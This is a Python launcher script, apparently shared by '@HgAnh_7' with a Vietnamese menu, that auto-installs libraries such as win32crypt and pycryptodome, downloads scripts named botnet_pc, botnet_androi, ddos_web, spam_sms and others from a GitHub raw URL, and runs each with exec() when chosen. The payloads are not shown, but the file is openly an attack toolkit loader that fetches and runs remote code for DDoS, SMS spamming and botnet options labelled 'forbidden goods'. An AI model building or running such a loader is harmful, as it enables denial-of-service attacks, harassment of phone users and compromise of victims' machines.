# Share By @HgAnh_7

import os
import time
# import requests

# try:
#     import ms4, psutil, qrcode ,requests ,winshell, pycountry, screeninfo, win32crypt,pycryptodome, pywin32  
#     # import       
#     # import       
#     # import     
#     # import     
#     # import    
#     # import    
#     # import   
#     # import pycryptodome
# except ImportError:
#     os.system('pip install ms4==2.10.0') #psutil qrcode requests winshell pycountry screeninfo pywin32
#     os.system('pip install psutil')
#     os.system('pip install qrcode')
#     os.system('pip install requests')
#     os.system('pip install winshell')
#     os.system('pip install pycountry')
#     os.system('pip install pywin32')
#     os.system('pip install screeninfo')
#     os.system('pip install pycryptodome')
    
#     # os.system('cls' if os.name == 'nt' else 'clear')
# try:
#     import psutil
#     import requests
#     import pycountry
#     import screeninfo
#     import pycryptodome
#     import winshell
#     import pypiwin32
#     # import 
#     # import 
#     # import 
# except ImportError:
#     os.system('pip psutil install requests psutil pycountry screeninfo pycryptodome winshell pypiwin32 ')
# import requests

# import importlib
# import subprocess
# import sys

# # (Tên module để import, tên package để cài qua pip)
# required_packages = [
#     ("requests", "requests"),
#     ("psutil", "psutil"),
#     ("pycountry", "pycountry"),
#     ("screeninfo", "screeninfo"),
#     ("Cryptodome", "pycryptodome"),   # Import Cryptodome -> pip install pycryptodome
#     ("winshell", "winshell"),
#     ("win32crypt", "pywin32"),        # Import win32crypt -> pip install pywin32
# ]

# def install_if_missing(import_name, pip_name):
#     try:
#         importlib.import_module(import_name)
#         print(f"✔ Đã có: {pip_name}")
#     except ImportError:
#         print(f"⏳ Đang cài đặt: {pip_name}")
#         subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name])

# for import_name, pip_name in required_packages:
#     install_if_missing(import_name, pip_name)


#############################################################

# try:
#     import ms4
#     import psutil
#     import qrcode
#     import requests
#     import winshell
#     import pycountry
#     import screeninfo
#     import win32crypt
#     import pycryptodome
# except ImportError:
#     os.system('pip install ms4==2.10.0')
#     os.system('pip install psutil')
#     os.system('pip install qrcode')
#     os.system('pip install requests')
#     os.system('pip install winshell')
#     os.system('pip install pycountry')
#     os.system('pip install screeninfo')
#     os.system('pip install pywin32')  #win32crypt
#     os.system('pip install pycryptodome')
    
############################################################


# try:
#     import ms4
# except ImportError:
#     os.system('pip install ms4==2.10.0')

# try:
#     import psutil
# except ImportError:
#     os.system('pip install psutil')

# try:
#     import qrcode
# except ImportError:
#     os.system('pip install qrcode')

# try:
#     import requests
# except ImportError:
#     os.system('pip install requests')

# try:
#     import winshell
# except ImportError:
#     os.system('pip install winshell')

# try:
#     import pycountry
# except ImportError:
#     os.system('pip install pycountry')

# try:
#     import screeninfo
# except ImportError:
#     os.system('pip install screeninfo')

# try:
#     import win32crypt
# except ImportError:
#     os.system('pip install pywin32')  ## Import win32crypt -> pip install pywin32

# try:
#     import pycryptodome
# except ImportError:
#     os.system('pip install pycryptodome')

# #####

# try:
#     import win32crypt
# except ImportError:
#     os.system('cls' if os.name == 'nt' else 'clear')
#     print("🔁 \033[1;91mVui lòng chạy lại tool để hoàn tất việc load thư viện\033[1;97m.\n")
#     exit()

##################################################################################################

# import os
import sys
import subprocess

required_packages = {
    "ms4": "ms4==2.10.0",
    "psutil": "psutil",
    "qrcode": "qrcode",
    "requests": "requests",
    "winshell": "winshell",
    "pycountry": "pycountry",
    "screeninfo": "screeninfo",
    "win32crypt": "pywin32",
    "Crypto": "pycryptodome"
}

for module, package in required_packages.items():
    try:
        __import__(module)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Kiểm tra lại riêng win32crypt
try:
    import win32crypt
except ImportError:
    os.system('cls' if os.name == 'nt' else 'clear')
    print("🔁 \033[1;91mVui lòng chạy lại tool để hoàn tất việc load thư viện\033[1;97m.\n")
    exit()


import requests

# Định nghĩa màu
black = "\033[1;90m"
red = "\033[1;91m"
green = "\033[1;92m"
yellow = "\033[1;93m"
blue = "\033[1;94m"
purple = "\033[1;95m"
cyan = "\033[1;96m"
white = "\033[1;97m"

# Định nghĩa ký tự thông báo
a = f"{white}[{cyan}*{white}]" # [*]

#Tool
url = "https://raw.githubusercontent.com/HgAnh7/Tool/refs/heads/main/"
banner = requests.get(url+"banner.py").text
QR_code = requests.get(url+"QR_code.py").text
botnet_androi = requests.get(url+"botnet_androi.py").text
create_proxy = requests.get(url+"create_proxy.py").text
ddos_web = requests.get(url+"ddos_web.py").text
encode = requests.get(url+"encode.py").text
info_tikok = requests.get(url+"info_tikok.py").text
spam_sms = requests.get(url+"spam_sms.py").text
botnet_pc = requests.get(url+"botnet_pc.py").text

while True:
    exec(banner)
    print(f'''{a} {yellow}0.1{white}: {red}Hàng Cấm {purple}[Only PC]
{a} {yellow}0.2{white}: {red}Hàng Cấm {purple}[Only Androi]
{a} {yellow}1.1{white}: {blue}Tool Spam Sms {green}[Online]
{a} {yellow}2.1{white}: {blue}Tấn Công Trang WEB {green}[Online]
{a} {yellow}3.1{white}: {blue}Công Cụ Mã Hóa PYTHON {green}[Online]
{a} {yellow}4.1{white}: {blue}Công Tạo Proxy Ngẫu Nhiên {green}[Online]
{a} {yellow}5.1{white}: {blue}Công Cụ Kiểm Tra Thông Tin TikTok {green}[Online]
{a} {yellow}Enter{white}: {cyan}Thoát Tool
{white}════════════════════════════════════════════════════════''')
    select = input(f'{red}┌─╼{white}[{red}<{white}/{red}>{white}]--{red}>{white} Nhập Lựa Chọn {white} \n{red}└─╼{red}✈ {yellow}: ')
    print(f'{white}════════════════════════════════════════════════════════\033[0m')

    if select == '0.1':
        exec(botnet_pc)
        time.sleep(5)
    elif select == '0.2':
        exec(botnet_androi)
        time.sleep(5)
    elif select == '1.1':
        exec(banner)
        exec(spam_sms)
    elif select == '2.1':
        exec(banner)
        exec(ddos_web)
    elif select == '3.1':
        exec(banner)
        exec(encode)
    elif select == '4.1':
        exec(banner)
        exec(create_proxy)
    elif select == '5.1':
        exec(banner)
        exec(info_tikok)
    elif select == '':
        exit()
    else:
        print(f'{red}Lỗi: Lựa chọn không hợp lệ! Vui lòng nhập lại.\033[0m')
        time.sleep(2)  # Đợi người dùng nhấn Enter rồi tiếp tục
